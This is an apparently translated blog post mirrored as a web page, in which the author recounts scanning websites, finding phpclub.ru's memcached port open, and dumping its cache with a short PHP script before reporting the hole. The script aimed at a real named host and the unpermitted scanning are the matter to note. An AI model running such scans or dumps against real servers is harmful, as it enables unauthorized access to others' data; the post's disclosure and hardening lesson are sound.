<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How I found a vulnerability on phpclub.ru</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In a quiet, warm evening, developing a caching system through memcached and adding a server, a thought suddenly came to me. 


 How it all began 
 It ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How I found a vulnerability on phpclub.ru</h1><div class="post__text post__text-html js-mediator-article">  In a quiet, warm evening, developing a caching system through memcached and adding a server, a thought suddenly came to me. <br><img align="left" src="https://habrastorage.org/storage2/991/105/f9a/991105f9afcb9166e4a93fad6f7a60d2.jpg"><br><br><h5>  How it all began </h5><br>  It all started when I moved from the Debian family to the RHEL family.  About a week ago, for the first time with my own hands (I can‚Äôt say that on Ubuntu it was with my own hands) I picked up a server to develop a project.  I do nginx, apache, php configs with my own hands - before, everything on Ubuntu was put in a couple of commands and it worked by itself.  However, ruling configs, I began to better understand how it all works there.  Probably it pushed me to think about memcached. <br><br><a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h5>  Target search </h5><br>  At first, I certainly experimented (set memcached from rpm and forgot) on my machine and was not surprised by the result, since the technology itself <u>implies scaling by servers and does not provide for authorization.</u>  But I strongly doubted that someone would leave such a hole in a real project.  But nothing prevented me from checking it out.  I used <a href="http://nmap.org/">nmap</a> as a port scanner.  Yes, the UFO will forgive me the first in the queue was habrahabr.ru, but it adequately passed the test, but attempt number 4: <br><img src="https://habrastorage.org/storage2/0c3/21b/35e/0c321b35e75c616df9041f37a7232942.png"><br><br><h5>  11211 port is open.  To action </h5><br>  I wrote a small script on the local machine and success: <br><img src="https://habrastorage.org/storage2/0f0/b98/a7a/0f0b98a7ad9baf1e7e0d7a7c6c07f0fa.png"><br>  The smallness of the finalized script: <br><div class="spoiler">  <b class="spoiler_title">Here he is</b> <div class="spoiler_text"><pre><code class="php hljs">$t= <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Memcached (); $t-&gt;addServer(<span class="hljs-string"><span class="hljs-string">'phpclub.ru'</span></span>, <span class="hljs-number"><span class="hljs-number">11211</span></span>); $z=$t-&gt;getAllKeys(); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>($z <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $k=&gt;$v){ var_dump($t-&gt;get($v)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $v,<span class="hljs-string"><span class="hljs-string">'---'</span></span>,$k,<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; }</code> </pre> </div></div><br>  A very promising result was obtained for a hacker: all data was serialized.  I began to analyze the data, in which I was able to recognize the cache for the menu of the faq section. <br>  And here he is: <br><pre> <code class="php hljs">linktracking|i:<span class="hljs-number"><span class="hljs-number">0</span></span>;bookmarks|a:<span class="hljs-number"><span class="hljs-number">5</span></span>:{i:<span class="hljs-number"><span class="hljs-number">0</span></span>;s:<span class="hljs-number"><span class="hljs-number">11</span></span>:<span class="hljs-string"><span class="hljs-string">"(())"</span></span>;i:<span class="hljs-number"><span class="hljs-number">1</span></span>;s:<span class="hljs-number"><span class="hljs-number">13</span></span>:<span class="hljs-string"><span class="hljs-string">"(())"</span></span>;i:<span class="hljs-number"><span class="hljs-number">2</span></span>;s:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-string"><span class="hljs-string">"(())"</span></span>;i:<span class="hljs-number"><span class="hljs-number">3</span></span>;s:<span class="hljs-number"><span class="hljs-number">16</span></span>:<span class="hljs-string"><span class="hljs-string">"(())"</span></span>;i:<span class="hljs-number"><span class="hljs-number">4</span></span>;s:<span class="hljs-number"><span class="hljs-number">27</span></span>:<span class="hljs-string"><span class="hljs-string">"(( ))"</span></span>;}bookmarklinks|a:<span class="hljs-number"><span class="hljs-number">5</span></span>:{i:<span class="hljs-number"><span class="hljs-number">0</span></span>;s:<span class="hljs-number"><span class="hljs-number">7</span></span>:<span class="hljs-string"><span class="hljs-string">"katalog"</span></span>;i:<span class="hljs-number"><span class="hljs-number">1</span></span>;s:<span class="hljs-number"><span class="hljs-number">10</span></span>:<span class="hljs-string"><span class="hljs-string">"izmenenija"</span></span>;i:<span class="hljs-number"><span class="hljs-number">2</span></span>;s:<span class="hljs-number"><span class="hljs-number">16</span></span>:<span class="hljs-string"><span class="hljs-string">"novyekommentarii"</span></span>;i:<span class="hljs-number"><span class="hljs-number">3</span></span>;s:<span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-string"><span class="hljs-string">"pol_zovateli"</span></span>;i:<span class="hljs-number"><span class="hljs-number">4</span></span>;s:<span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-string"><span class="hljs-string">"registracija"</span></span>;}bookmarksfmt|s:<span class="hljs-number"><span class="hljs-number">157</span></span>:<span class="hljs-string"><span class="hljs-string">"—û—û ==–á–á | —û—û ==–á–á | —û—û ==–á–á | —û—û ==!!!–á–á | —û—û ==–á–á"</span></span>;show_comments|a:<span class="hljs-number"><span class="hljs-number">1</span></span>:{s:<span class="hljs-number"><span class="hljs-number">24</span></span>:<span class="hljs-string"><span class="hljs-string">"qhelp/HowToDisplayErrors"</span></span>;i:<span class="hljs-number"><span class="hljs-number">0</span></span>;}<span class="hljs-string"><span class="hljs-string">'</span></span></code> </pre><br>  <b>Honestly, he looked right like that!</b>  Any matches are considered an accident. <br>  And this is how the page with this cache looks like: <br><img src="https://habrastorage.org/webt/kf/ry/4o/kfry4o0ykjoazl0h3fu__g-1k54.png"><br>  UPD old picture first in the img tag <br><h5>  What's next? </h5><br>  And what did not happen further and how I did not use the magic methods toString and destruct will not be told, the moral is not in it;) <br>  Naturally, I immediately tried to get in touch with the admin, reported the vulnerability and at the moment it is closed. <br><br>  Morality: <br>  Closing the port from external networks is not a tricky thing, but even the Jedi phpclub.ru can lose sight of it.  This case, a real life example, shows that people can make mistakes even in such seemingly elementary, obvious things.  Trust the security and server configuration to professionals. <br><br>  And do not expect that your ip (even without a domain attached to it) will not scan the address. <br><iframe width="560" height="315" src="https://www.youtube.com/embed/wbWOVfY-rxU" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Hundreds of <b>habrauser</b> <s>Jedi</s> are on their way, and behind them is an army of <s>clone</s> <b>bots</b> . <br>  PS <br>  And who knows how many more bicycles are built on the Internet and how many of them have blocked access to memcached from external ip ... <br>  Who knows‚Ä¶ </div><p>Source: <a href="https://habr.com/ru/post/190260/">https://habr.com/ru/post/190260/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../190244/index.html">Testing the adaptive layout of the local site</a></li>
<li><a href="../190246/index.html">It's clear about CSS Masking and Shapes Modules, or the Future Revolution of Content Design</a></li>
<li><a href="../190250/index.html">Paving the way through the stomach</a></li>
<li><a href="../190252/index.html">Write down your terminal</a></li>
<li><a href="../190258/index.html">Safety of bank plastic cards - myth or reality?</a></li>
<li><a href="../190266/index.html">Perl6 - Working with Data Types</a></li>
<li><a href="../190268/index.html">What does business process automation using IBM BPM and J2EE provide?</a></li>
<li><a href="../190270/index.html">Scientific and educational comics for children - issue 2</a></li>
<li><a href="../190272/index.html">Two-wheeled automation of uploading files to the server from Notepad ++</a></li>
<li><a href="../190274/index.html">Say no to formatting with spaces and enterrs.</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>